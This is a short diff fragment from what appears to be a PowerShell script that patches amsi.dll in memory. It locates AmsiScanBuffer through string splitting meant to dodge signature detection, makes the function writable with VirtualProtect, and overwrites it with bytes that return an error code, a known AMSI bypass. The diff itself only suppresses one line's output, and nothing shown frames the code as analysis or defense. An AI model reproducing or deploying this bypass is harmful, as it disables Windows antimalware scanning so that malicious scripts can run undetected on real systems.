@@ -16,6 +16,6 @@ Add-Type $Win32
 $LoadLibrary = [Win32]::LoadLibrary("am" + "si.dll")
 $Address = [Win32]::GetProcAddress($LoadLibrary, "Amsi" + "Scan" + "Buffer")
 $p = 0
-[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
+[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p) > $null
 $Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
 [System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
